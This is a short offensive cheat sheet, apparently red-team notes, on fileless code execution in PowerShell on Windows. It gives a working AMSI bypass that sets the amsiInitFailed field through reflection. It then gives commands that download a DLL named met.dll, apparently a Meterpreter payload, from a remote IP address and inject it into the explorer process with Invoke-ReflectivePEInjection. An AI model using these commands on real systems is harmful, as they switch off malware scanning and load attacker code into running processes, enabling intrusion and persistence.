# Start process in a suspended state.  Read the entry point of the app and replace with shellcode.  Then resume execution of application
<br>
Use [System.Reflection.Assembly]::Load if you have a C# tool and you want to run it quickly within your own PowerShell process. It is the "standard" way to do fileless .NET execution.  

Use Invoke-ReflectivePEInjection.ps1 if you have a native C++ tool, or if you need to inject your payload into a remote process (like a system service) to hide or escalate privileges.  
<br><br>

[Invoke-ReflectivePEInjection.ps1 script to load DLL]([https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)


### Steps

1. Bypass AMSI
``` powershell
$fields = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
$fields.SetValue($null,$true)
```
<br>
2. Copy Invoke-ReflectivePEInjection.ps1 to host or download.  Import
3. Download Bytes of .dll file and get ProcID of process youd like to migrate into.  
<br>
<br>

``` powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.196:4443/met.dll')
$procid = (Get-Process -Name explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

```


